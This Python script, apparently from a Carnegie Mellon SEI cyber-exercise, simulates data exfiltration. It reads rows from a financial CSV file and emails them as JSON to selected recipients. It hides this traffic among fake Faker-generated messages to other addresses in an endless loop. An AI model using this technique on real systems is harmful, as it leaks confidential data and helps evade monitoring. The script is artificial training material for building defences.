#!/usr/bin/python3

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


import smtplib, random, json, time
from faker import Faker
import pandas as pd
fake = Faker()

sender = "neo@matrix"
possible_recipients = [
    "moonman@merch.codes", "number1@merch.codes", 
    "drjones@merch.codes", "royrogers@merch.codes",
    "parley@merch.codes", "stayclassy@merch.codes",
    "righteous@merch.codes", "punchy@merch.codes",
    "skippin@merch.codes", "funnyguy@merch.codes",
    "detective@merch.codes", "littlefriend@merch.codes"
]
num = int('#tmp')
exfil_recipients = possible_recipients[:num]

records = pd.read_csv("/home/user/Desktop/startup/financial_data.csv",keep_default_na=False, na_filter=False).to_dict('index')
record_list = list(records.values())

record_list_index = 0
while True:
    for recp in possible_recipients:
        record_list_index = record_list_index % len(record_list)
        with smtplib.SMTP('mail.merch.codes', 25) as smtp:
            subject = ""
            body = ""
            if recp in exfil_recipients:
                subject = f"As discussed {recp[:recp.index('@')]}"  
                body = json.dumps(record_list[record_list_index])
            else:
                subject = f"Hello {recp[:recp.index('@')]}"
                body = fake.text()
            msg = "Subject: {}\n\n{}".format(subject, body)
            try:
                smtp.sendmail(sender,recp,msg)
            except:
                print("ERROR: Issue when sending mail.")
        record_list_index += 1
        print("sleeping...")
        time.sleep(random.randint(3,5))
